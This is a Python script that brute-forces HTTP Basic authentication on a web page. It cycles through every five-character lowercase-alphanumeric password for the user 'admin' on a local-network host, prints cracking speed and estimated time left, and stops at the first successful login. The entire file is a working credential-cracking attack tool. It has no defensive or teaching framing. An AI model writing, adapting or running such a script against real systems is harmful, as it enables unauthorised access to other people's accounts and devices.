__author__ = 'mine_bit'

import sys
import time
import base64
import string

import httplib2


def afunction(password_start):
    # -------------------------------------------------------------------------- ONLY ONCE
    charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
    h = httplib2.HTTP('192.168.178.25')
    num = len(charset) ** 2
    print("Trying to crack parse.html...\n")

    # STATUS VARIABLES
    totspeed = 0
    c = 0
    total = 36 ** 5

    # GET THE INDEXES TO START WHERE THEY SHOULD
    first_time = True

    ilist = []
    for i in password_start:
        for index, j in enumerate(charset):
            if i == j:
                ilist.append(index)

    # USERNAME
    userid = 'admin'

    # -------------------------------------------------------------------------- LOOP
    for idx, l in enumerate(charset):
        _q = idx
        if idx < ilist[0] and first_time:
            continue
        for idx2, m in enumerate(charset):
            _w = idx2
            if idx2 < ilist[1] and first_time:
                continue
            for idx3, n in enumerate(charset):
                _e = idx3
                if idx3 < ilist[2] and first_time:
                    continue
                at = time.time()
                for idx4, o in enumerate(charset):
                    if idx4 < ilist[3] and first_time:
                        continue
                    for idx5, p in enumerate(charset):
                        if idx5 < ilist[4] and first_time:
                            continue

                        # PASSWORD
                        passwd = l + m + n + o + p
                        first_time = False

                        auth = 'Basic ' + string.strip(base64.encodestring(userid + ':' + passwd))

                        h.putrequest('GET', '/parse.html')
                        h.putheader('Authorization', auth)
                        h.endheaders()
                        if h.getreply()[0] == 401:
                            continue
                        elif h.getreply()[0] == 200:
                            print("Login succes!!  Username: %s" % userid, "   Password: %s" % passwd)
                            sys.exit()
                        else:
                            print("Conncection lost...")
                            sys.exit()

                # STATUS UPDATE
                bt = time.time()
                dt = bt - at
                totpasswd = num / dt
                totspeed += int(totpasswd)
                c += 1.
                average = totspeed / c
                aa = (36 - (_q + 1))
                bb = (36 - (_w + 1))
                cc = (36 - (_e + 1))
                if aa == 0: aa = 1
                if bb == 0: bb = 1
                if cc == 0: cc = 1
                passwordsleft = (aa * 36 ** 4) + (bb * 36 ** 3) + (cc * 36 ** 2) + (36 ** 2) + 36.
                estimatation = ((passwordsleft / average) / 3600.)
                print(userid, "::::", l + m + n + 'xx', "::::", "  Processed %d passwords / sec" % totpasswd, "::::",
                      "  Estimated time left: %d hours" % estimatation, "::::", "  Passwords Left: %d" % passwordsleft,
                      "::::", "  Done: %.2f %%" % (100 - (((passwordsleft / total)) * 100)))

    print("No password found.. Try something else.... ")

# RUN SCRIPT
afunction('aaiaa')
